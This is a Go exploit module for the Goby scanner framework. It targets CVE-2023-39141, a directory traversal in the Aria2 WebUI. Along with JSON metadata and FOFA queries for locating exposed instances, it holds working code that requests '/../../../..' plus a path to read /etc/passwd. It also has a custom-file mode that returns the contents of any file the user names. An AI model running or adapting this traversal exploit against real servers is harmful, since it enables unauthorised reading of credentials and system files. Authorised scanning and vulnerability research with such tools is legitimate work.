package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Aria2 WebUI Console /../../../../etc/passwd File Read Vulnerability(CVE-2023-39141)",
    "Description": "<p>The Aria2 WebUI Console is a utility used for downloading files. It supports HTTP (S)/FTP/FTP/BitTorrent and Metalink protocols. Aria2 can download files from multiple sources/protocols and try to utilize your maximum download bandwidth. It supports downloading files from both HTTP (S)/FTP/SFTP and BitTorrent simultaneously, and uploading data downloaded from HTTP (S)/FTP/SFTP to BitTorrent groups. Using Metalink block checksum, aria2 automatically verifies data blocks when downloading files.Aria2 WebUI console has a directory traversal vulnerability, which allows unauthorized attackers to exploit it/ Traversing the directory to read any system file can lead to sensitive information leakage and put the system in an extremely insecure state.</p>",
    "Product": "Aria2",
    "Homepage": "https://aria2.github.io/",
    "DisclosureDate": "2024-11-13",
    "PostTime": "2024-11-13",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "body=\"Aria2\" && title=\"WebUI\"",
    "GobyQuery": "body=\"Aria2\" && title=\"WebUI\"",
    "Level": "1",
    "Impact": "<p>Download any server file, including source code files, system sensitive files, configuration files, and more.</p>",
    "Recommendation": "<p>1. Enable web users to only access (read) the required files and paths</p><p> 2. Cannot have files containing vulnerabilities, directory traversal vulnerabilities, or other vulnerabilities </p><p> 3. Prevent users from accessing paths outside the web root directory. </p><p> 4. The manufacturer has released the latest fix version, follow<a href=\"https://aria2.github.io/\">https://aria2.github.io/</a></p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/135760048?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "passwd,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/etc/passwd",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2023-39141"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.0",
    "Translation": {
        "CN": {
            "Name": "Aria2 WebUI控制台 /../../../../etc/passwd 文件读取漏洞（CVE-2023-39141）",
            "Product": "Aria2",
            "Description": "<p>Aria2&nbsp;WebUI控制台是用于下载文件的实用程序。它支持 HTTP(S)/FTP/SFTP/BitTorrent 和 Metalink 协议。aria2可以从多个来源/协议下载文件，并尝试利用您的最大下载带宽。它支持同时从HTTP(S)/FTP/SFTP和BitTorrent下载文件，而从HTTP（S）/FTP/SFTP下载的数据上传到BitTorrent群。使用 Metalink 块校验和，aria2 在下载文件时自动验证数据块。<br>Aria2&nbsp;WebUI控制台存在目录遍历漏洞，未授权的攻击者可通过../目录遍历读取任意系统文件，导致系统敏感信息泄露，使系统处于极不安全的状态。<br></p>",
            "Recommendation": "<p>1、让web 用户只能访问（读取），所需要的文件和路径&nbsp;</p><p>2、不能有文件包含漏洞，目录遍历漏洞或其他漏洞&nbsp;</p><p>3、让用户不能访问Web 根目录以外的路径。</p><p>&nbsp;4、该厂商发布最新修复版本，关注<a href=\"https://aria2.github.io/\">https://aria2.github.io/</a><br></p>",
            "Impact": "<p>下载服务器任意文件，包括源代码文件、系统敏感文件、配置文件等等。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Aria2 WebUI Console /../../../../etc/passwd File Read Vulnerability(CVE-2023-39141)",
            "Product": "Aria2",
            "Description": "<p>The Aria2 WebUI Console is a utility used for downloading files. It supports HTTP (S)/FTP/FTP/BitTorrent and Metalink protocols. Aria2 can download files from multiple sources/protocols and try to utilize your maximum download bandwidth. It supports downloading files from both HTTP (S)/FTP/SFTP and BitTorrent simultaneously, and uploading data downloaded from HTTP (S)/FTP/SFTP to BitTorrent groups. Using Metalink block checksum, aria2 automatically verifies data blocks when downloading files.Aria2 WebUI console has a directory traversal vulnerability, which allows unauthorized attackers to exploit it/ Traversing the directory to read any system file can lead to sensitive information leakage and put the system in an extremely insecure state.<br></p>",
            "Recommendation": "<p>1. Enable web users to only access (read) the required files and paths</p><p>&nbsp;2. Cannot have files containing vulnerabilities, directory traversal vulnerabilities, or other vulnerabilities&nbsp;</p><p>&nbsp;3. Prevent users from accessing paths outside the web root directory.&nbsp;</p><p>&nbsp;4. The manufacturer has released the latest fix version, follow<a href=\"https://aria2.github.io/\">https://aria2.github.io/</a><br></p>",
            "Impact": "<p>Download any server file, including source code files, system sensitive files, configuration files, and more.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9971"
}`

	postOrGet_m9jXTEDGmn := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Connection":      "close",
		}

		resp, err := setGetRequest(hostInfo, "/../../../.."+fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/../../../.."
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/etc/passwd": "root",
			}
			// 函数继承
			uploadFileFunc := postOrGet_m9jXTEDGmn

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL + fileUrl
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])
			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"passwd": {"/etc/passwd", "root"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_m9jXTEDGmn
			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}
			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			expResult.Success = true
			expResult.Output = "Sensitive information leakage:\n"+resp
			return expResult
		},
	))
}
